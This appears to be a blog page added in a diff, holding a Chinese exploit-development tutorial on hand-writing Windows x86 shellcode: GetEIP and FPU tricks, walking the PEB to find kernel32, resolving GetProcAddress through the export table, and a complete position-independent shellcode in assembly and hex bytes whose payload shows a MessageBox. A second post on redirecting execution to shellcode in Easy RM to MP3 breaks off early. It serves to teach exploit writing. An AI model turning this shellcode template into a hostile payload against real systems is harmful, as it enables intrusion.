@@ -157,6 +157,337 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-自制payload" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/22/自制payload/">手写payload</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/22/自制payload/" class="archive-article-date">
+  	<time datetime="2018-10-22T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-22</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>GetEip</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.type_a 由于有0容易发生截断</span><br><span class="line">00401000 E8 00000000 call 00401005</span><br><span class="line">00401005 58			 pop eax</span><br><span class="line"></span><br><span class="line">1.type_b 由于INC EBX可能出现问题</span><br><span class="line">00401000 E8 FFFFFFFF call 00401004</span><br><span class="line">00401005 C3		 	 RETN; FF C3=INC EBX</span><br><span class="line">00401006 58			 POP EAX</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FPU</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">X87浮点单元</span><br><span class="line">struct FpuSaveState</span><br><span class="line">&#123;</span><br><span class="line">	uint32 control_word</span><br><span class="line">	uint32 status_word</span><br><span class="line">	uint32 tag_word</span><br><span class="line">	uint32 fpu_instruction_pointer; 指向上一条执行指令</span><br><span class="line">	uint16 fpu_instruction_selector;</span><br><span class="line">	uint16 fpu_opcode</span><br><span class="line">	uint32 fpu_operand_pointer</span><br><span class="line">	uint16 fpu_operand_selector</span><br><span class="line">	uint16 reserved</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FLDZ</span><br><span class="line">FNSTENV [esp-0C] esp指向fpu_instruction_pointer</span><br><span class="line">POP EBX</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>调试payload</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">VS调试payload</span><br><span class="line">char shellcode[] = &quot;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		LEA EAX, shellcode</span><br><span class="line">		PUSH EAX</span><br><span class="line">		RET</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>windows弹窗payload————适用与各种windows版本</p>
+</blockquote>
+<ul>
+<li><p>思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.进程加载的所有模块信息都保存在PEB结构中,通过该结构获取kernel32.dll的基址</span><br><span class="line">2.通过PE文件导出表的方式,再kernel32.dll找到需要的关键函数GetProcAddress的地址</span><br><span class="line">3.通过GetProcAddress得到LoadLibrary地址</span><br><span class="line">4.然后任意的函数地址都可以获取</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>kernel32.dll获取流程和程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1.通过fs找到TEB,TEB偏移0x30即为PEB</span><br><span class="line">2.PEB偏移0x0C处为保存指针PEB_LDR_DATA</span><br><span class="line">0:000&gt; dt _peb_ldr_data</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +0x000 Length           : Uint4B</span><br><span class="line">   +0x004 Initialized      : UChar</span><br><span class="line">   +0x008 SsHandle         : Ptr32 Void</span><br><span class="line">   +0x00c InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x014 InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x01c InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x024 EntryInProgress  : Ptr32 Void</span><br><span class="line">   +0x028 ShutdownInProgress : UChar</span><br><span class="line">   +0x02c ShutdownThreadId : Ptr32 Void</span><br><span class="line">3._PEB_LDR_DATA结构体的InInitializationOrderModuleList等于_ldr_data_table_entry的InInitializationOrderLinks</span><br><span class="line">typedef struct _LIST_ENTRY&#123;</span><br><span class="line">	struct _LIST_ENTRY *Flink;</span><br><span class="line">	struct _LIST_ENTRY *Blink;</span><br><span class="line">&#125;List_ENTRY;</span><br><span class="line">0:000&gt; dt _ldr_data_table_entry</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x008 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x018 DllBase          : Ptr32 Void</span><br><span class="line">   +0x01c EntryPoint       : Ptr32 Void</span><br><span class="line">   +0x020 SizeOfImage      : Uint4B</span><br><span class="line">   +0x024 FullDllName      : _UNICODE_STRING</span><br><span class="line">   +0x02c BaseDllName      : _UNICODE_STRING</span><br><span class="line">4.所以获取kernel32.dll/kernelBase.dll的代码如下:</span><br><span class="line">__asm&#123;</span><br><span class="line">	mov esi,dword ptr fs:[0x30]</span><br><span class="line">	mov esi,[esi+0x0C]</span><br><span class="line">	mov esi,[esi+0x1C]</span><br><span class="line">	mov esi,[esi]</span><br><span class="line">	mov ebx,[esi+0x08]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>GetProcAddress获取流程</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.PE文件规律</span><br><span class="line">  PE头 = ImageBase + 0x3C</span><br><span class="line">  ExportTable = PE头 + 0x78 </span><br><span class="line">  EAT = ExportTable + 0x1C</span><br><span class="line">  ENT = ExportTable + 0x20</span><br><span class="line">  EOT = ExportTable + 0x24</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>处理数据python脚本</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#16进制处理版本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">str1 = &apos;&apos;&apos;47 65 74 50 72 6F 63 41 64 64 72 65 73 73 4C 6F</span><br><span class="line">61 64 4C 69 62 72 61 72 79 45 78 41 00 55 73 65</span><br><span class="line">72 33 32 2E 64 6C 6C 00 4D 65 73 73 61 67 65 42</span><br><span class="line">6F 78 41 00 45 78 69 74 50 72 6F 63 65 73 73 00</span><br><span class="line">48 65 6C 6C 6F 20 57 72 6F 6C 64 21 00&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;1.txt&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    #str1.split(&quot;&quot;)</span><br><span class="line">    list1 = str1.split()</span><br><span class="line">    count = 1</span><br><span class="line">    for i in list1:</span><br><span class="line">        f.write(&quot;_asm _emit(0x&quot; + i + &quot;)&quot;)</span><br><span class="line">        if((count % 4 == 0)):</span><br><span class="line">            f.write(&quot;\n&quot;)</span><br><span class="line">        if((count % 4 != 0) &amp; (i == &apos;00&apos;)):</span><br><span class="line">            f.write(&quot;\n&quot;)</span><br><span class="line">            count = 0</span><br><span class="line">        count+=1</span><br><span class="line"></span><br><span class="line">#str处理版本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">str1 = &apos;&apos;&apos;GetProcAddressLo </span><br><span class="line">adLibraryExA\0Use </span><br><span class="line">r32.dll\0MessageB </span><br><span class="line">oxA\0ExitProcess\0 </span><br><span class="line">Hello World!\0&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;2.txt&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    #str1.split(&quot;&quot;)</span><br><span class="line">    list1 = str1.split()</span><br><span class="line">    count = 1</span><br><span class="line">    for i in list1:</span><br><span class="line">        for j in i:</span><br><span class="line">            f.write(&quot;_asm _emit(0x&quot; + j.encode(&apos;hex&apos;) + &quot;)&quot;)</span><br><span class="line">            if((count % 4 == 0)):</span><br><span class="line">                f.write(&quot;\n&quot;)</span><br><span class="line">            if((count % 4 != 0) &amp; (j.encode(&apos;hex&apos;) == &apos;00&apos;)):</span><br><span class="line">                f.write(&quot;\n&quot;)</span><br><span class="line">                count = 0</span><br><span class="line">            count+=1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>最后payload版本</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		PUSHAD</span><br><span class="line">		SUB ESP,0x60</span><br><span class="line">		JMP tag_ShellCode		</span><br><span class="line">		//[tag_next - 0x52] &quot;GetProcAddress&quot;</span><br><span class="line">		_asm _emit(0x47)_asm _emit(0x65)_asm _emit(0x74)_asm _emit(0x50)</span><br><span class="line">		_asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)_asm _emit(0x41)</span><br><span class="line">		_asm _emit(0x64)_asm _emit(0x64)_asm _emit(0x72)_asm _emit(0x65)</span><br><span class="line">		_asm _emit(0x73)_asm _emit(0x73)</span><br><span class="line">		//[tag_next - 0x44] &quot;LoadLibraryExA\0&quot;</span><br><span class="line">		_asm _emit(0x4C)_asm _emit(0x6F)_asm _emit(0x61)_asm _emit(0x64)</span><br><span class="line">		_asm _emit(0x4C)_asm _emit(0x69)_asm _emit(0x62)_asm _emit(0x72)</span><br><span class="line">		_asm _emit(0x61)_asm _emit(0x72)_asm _emit(0x79)_asm _emit(0x45)</span><br><span class="line">		_asm _emit(0x78)_asm _emit(0x41)_asm _emit(0x00)</span><br><span class="line">		//[tag_next - 0x35] &quot;User32.dll\0&quot;</span><br><span class="line">		_asm _emit(0x55)_asm _emit(0x73)_asm _emit(0x65)_asm _emit(0x72)</span><br><span class="line">		_asm _emit(0x33)_asm _emit(0x32)_asm _emit(0x2E)_asm _emit(0x64)</span><br><span class="line">		_asm _emit(0x6C)_asm _emit(0x6C)_asm _emit(0x00)</span><br><span class="line">		//[tag_next - 0x2A] &quot;MessageBoxA\0&quot;</span><br><span class="line">		_asm _emit(0x4D)_asm _emit(0x65)_asm _emit(0x73)_asm _emit(0x73)</span><br><span class="line">		_asm _emit(0x61)_asm _emit(0x67)_asm _emit(0x65)_asm _emit(0x42)</span><br><span class="line">		_asm _emit(0x6F)_asm _emit(0x78)_asm _emit(0x41)_asm _emit(0x00)</span><br><span class="line">		//[tag_next - 0x1E] &quot;ExitProcess\0&quot;</span><br><span class="line">		_asm _emit(0x45)_asm _emit(0x78)_asm _emit(0x69)_asm _emit(0x74)</span><br><span class="line">		_asm _emit(0x50)_asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)</span><br><span class="line">		_asm _emit(0x65)_asm _emit(0x73)_asm _emit(0x73)_asm _emit(0x00)</span><br><span class="line">		//[tag_next - 0x12] &quot;Hello World!\0&quot;</span><br><span class="line">		_asm _emit(0x48)_asm _emit(0x65)_asm _emit(0x6C)_asm _emit(0x6C)</span><br><span class="line">		_asm _emit(0x6F)_asm _emit(0x20)_asm _emit(0x57)_asm _emit(0x6F)</span><br><span class="line">		_asm _emit(0x72)_asm _emit(0x6C)_asm _emit(0x64)_asm _emit(0x21)</span><br><span class="line">		_asm _emit(0x00)</span><br><span class="line">	tag_ShellCode:</span><br><span class="line">		call tag_Next</span><br><span class="line">	tag_Next:</span><br><span class="line">		pop ebx //ebx为tag_Next地址</span><br><span class="line">		//2.获取关键模块基址</span><br><span class="line">		mov esi,dword ptr fs:[0x30]</span><br><span class="line">		mov esi,[esi + 0x0C]</span><br><span class="line"> 		mov esi, [esi + 0x1C]</span><br><span class="line">		mov esi, [esi]</span><br><span class="line">		mov edx, [esi+0x08] //edx存放kernel.dll地址</span><br><span class="line">		//3.获取GetProcAddress函数地址</span><br><span class="line">		push ebx</span><br><span class="line">		push edx //kernel32.dll</span><br><span class="line">		call fun_GetProcAddress</span><br><span class="line">		mov esi,eax</span><br><span class="line">		//4.获取LoadLliraryExA函数地址</span><br><span class="line">		lea ecx,[ebx - 0x44]</span><br><span class="line">		push edx</span><br><span class="line">		push ecx</span><br><span class="line">		push edx</span><br><span class="line">		call eax</span><br><span class="line">		//call payload</span><br><span class="line">		pop edx</span><br><span class="line">		push ebx //baseaddr</span><br><span class="line">		push esi //addr_GetProcAddress</span><br><span class="line">		push eax //addr_LoadLliraryExA</span><br><span class="line">		push edx //kernel32.dll</span><br><span class="line">		call fun_payload</span><br><span class="line">	fun_GetProcAddress:</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp,ESP</span><br><span class="line">		sub esp, 0x0C</span><br><span class="line">		push edx</span><br><span class="line">		//1.获取EAT,ENT,EOT地址</span><br><span class="line">		mov edx,[ebp+0x08] //kernel.32基址</span><br><span class="line">		mov esi,[edx + 0x3c] //DOS头.e_lfanew</span><br><span class="line">		lea esi,[edx+ esi] //文件头VA</span><br><span class="line">		mov esi,[esi+0x78] //ExportTable的RVA</span><br><span class="line">		lea esi,[edx + esi]//ExportTable的VA</span><br><span class="line">		mov edi,[esi + 0x1C] //EAT RVA</span><br><span class="line">		lea edi,[edx +edi] //EAT VA</span><br><span class="line">		mov [ebp-0x04],edi</span><br><span class="line">		mov edi, [esi + 0x20] //EAT RVA</span><br><span class="line">		lea edi, [edx + edi] //EAT VA</span><br><span class="line">		mov[ebp - 0x08], edi</span><br><span class="line">		mov edi, [esi + 0x24] //EAT RVA</span><br><span class="line">		lea edi, [edx + edi] //EAT VA</span><br><span class="line">		mov[ebp - 0x0C], edi</span><br><span class="line">		//2.循环比较NAT</span><br><span class="line">		xor eax,eax //将eax赋值为0</span><br><span class="line">		jmp Cmp_Start</span><br><span class="line">	Loop_Cmp:</span><br><span class="line">		INC eax</span><br><span class="line">	Cmp_Start:	</span><br><span class="line">		mov esi,[ebp-0x08] //获取ENT</span><br><span class="line">		mov esi,[esi+4*eax] //获取ENT RVA</span><br><span class="line">		mov edx,[ebp+0x08] //获取基址</span><br><span class="line">		lea esi,[esi+edx]  //获取esi地址</span><br><span class="line">		mov edi,[ebp+0x0c] //tag_next地址</span><br><span class="line">		lea edi,[edi-0x52] //获取GetProcAddress地址</span><br><span class="line">		mov ecx,0x0E //GetProcAddress长度</span><br><span class="line">		cld</span><br><span class="line">		repe cmpsb</span><br><span class="line">		jne Loop_Cmp</span><br><span class="line">		//成功取到地址</span><br><span class="line">		mov esi,[ebp-0x0c] //获取EOT</span><br><span class="line">		xor edi,edi</span><br><span class="line">		mov di,[esi+2*eax] //获取序号</span><br><span class="line">		//使用序号作为索引获取函数地址</span><br><span class="line">		mov esi,[ebp-0x04] //获取EAT</span><br><span class="line">		mov esi,[esi+edi*4] //获取函数地址RVA</span><br><span class="line">		mov edx,[ebp+0x08]</span><br><span class="line">		lea eax,[esi+edx] //获取函数地址</span><br><span class="line">		pop edx</span><br><span class="line">		mov ESP,ebp</span><br><span class="line">		pop ebp</span><br><span class="line">		retn 0x08</span><br><span class="line">	fun_payload:</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp,esp</span><br><span class="line">		sub ESP,0x08</span><br><span class="line">		mov ebx,[ebp+0x14] //baseaddr</span><br><span class="line">		//获取messageboxA函数地址</span><br><span class="line">		lea ecx,[ebx - 0x35] //user32.dll</span><br><span class="line">		push 0</span><br><span class="line">		push 0</span><br><span class="line">		push ecx</span><br><span class="line">		call [ebp + 0x0C]</span><br><span class="line">		lea ecx, [ebx - 0x2A] //messageboxA</span><br><span class="line">		push ecx</span><br><span class="line">		push eax</span><br><span class="line">		call [ebp + 0x10]</span><br><span class="line">		mov [ebp-0x04],eax</span><br><span class="line">		lea ecx, [ebx - 0x1E] //ExitProcess</span><br><span class="line">		push ecx</span><br><span class="line">		mov ecx, [ebp + 0x08]</span><br><span class="line">		push ecx  //kernel32.dll</span><br><span class="line">		call [ebp + 0x10]</span><br><span class="line">		mov[ebp - 0x08], eax</span><br><span class="line">		//显示messagebox</span><br><span class="line">		xor edx,edx</span><br><span class="line">		push edx</span><br><span class="line">		lea ecx,[ebx - 0x12]</span><br><span class="line">		push ecx</span><br><span class="line">		push ecx</span><br><span class="line">		push edx</span><br><span class="line">		call [ebp-0x04]</span><br><span class="line">		push 0</span><br><span class="line">		call [ebp-0x08]</span><br><span class="line">		mov ESP,ebp</span><br><span class="line">		pop ebp</span><br><span class="line">		retn 0x10</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">16进制payload:</span><br><span class="line">&#123;</span><br><span class="line">0x83, 0xEC, 0x60, 0xEB, 0x4D, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72,</span><br><span class="line">0x65, 0x73, 0x73, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x45, 0x78,</span><br><span class="line">0x41, 0x00, 0x55, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73,</span><br><span class="line">0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F,</span><br><span class="line">0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64,</span><br><span class="line">0x21, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x64, 0x8B, 0x35, 0x30, 0x00, 0x00, 0x00, 0x8B,</span><br><span class="line">0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x36, 0x8B, 0x56, 0x08, 0x53, 0x52, 0xE8, 0x14, 0x00, 0x00,</span><br><span class="line">0x00, 0x8B, 0xF0, 0x8D, 0x4B, 0xBC, 0x52, 0x51, 0x52, 0xFF, 0xD0, 0x5A, 0x53, 0x56, 0x50, 0x52,</span><br><span class="line">0xE8, 0x6E, 0x00, 0x00, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x52, 0x8B, 0x55, 0x08, 0x8B,</span><br><span class="line">0x72, 0x3C, 0x8D, 0x34, 0x32, 0x8B, 0x76, 0x78, 0x8D, 0x34, 0x32, 0x8B, 0x7E, 0x1C, 0x8D, 0x3C,</span><br><span class="line">0x3A, 0x89, 0x7D, 0xFC, 0x8B, 0x7E, 0x20, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF8, 0x8B, 0x7E, 0x24,</span><br><span class="line">0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF4, 0x33, 0xC0, 0xEB, 0x01, 0x40, 0x8B, 0x75, 0xF8, 0x8B, 0x34,</span><br><span class="line">0x86, 0x8B, 0x55, 0x08, 0x8D, 0x34, 0x16, 0x8B, 0x7D, 0x0C, 0x8D, 0x7F, 0xAE, 0xB9, 0x0E, 0x00,</span><br><span class="line">0x00, 0x00, 0xFC, 0xF3, 0xA6, 0x75, 0xE3, 0x8B, 0x75, 0xF4, 0x33, 0xFF, 0x66, 0x8B, 0x3C, 0x46,</span><br><span class="line">0x8B, 0x75, 0xFC, 0x8B, 0x34, 0xBE, 0x8B, 0x55, 0x08, 0x8D, 0x04, 0x16, 0x5A, 0x8B, 0xE5, 0x5D,</span><br><span class="line">0xC2, 0x08, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x08, 0x8B, 0x5D, 0x14, 0x8D, 0x4B, 0xCB, 0x6A,</span><br><span class="line">0x00, 0x6A, 0x00, 0x51, 0xFF, 0x55, 0x0C, 0x8D, 0x4B, 0xD6, 0x51, 0x50, 0xFF, 0x55, 0x10, 0x89,</span><br><span class="line">0x45, 0xFC, 0x8D, 0x4B, 0xE2, 0x51, 0x8B, 0x4D, 0x08, 0x51, 0xFF, 0x55, 0x10, 0x89, 0x45, 0xF8,</span><br><span class="line">0x33, 0xD2, 0x52, 0x8D, 0x4B, 0xEE, 0x51, 0x51, 0x52, 0xFF, 0x55, 0xFC, 0x6A, 0x00, 0xFF, 0x55,</span><br><span class="line">0xF8, 0x8B, 0xE5, 0x5D, 0xC2, 0x10, 0x00</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/22/自制payload/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-exploit_2_迫使shellcode执行方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/20/exploit_2_迫使shellcode执行方法/">exploit_2_迫使shellcode执行方法</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/20/exploit_2_迫使shellcode执行方法/" class="archive-article-date">
+  	<time datetime="2018-10-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
+<p>跳转方法:</p>
+<ul>
+<li>jmp/call<br>如果有寄存器可以利用来跳转到shellcode,则可以使用该方法来进行跳转<br>例如:jmp esp/call esp</li>
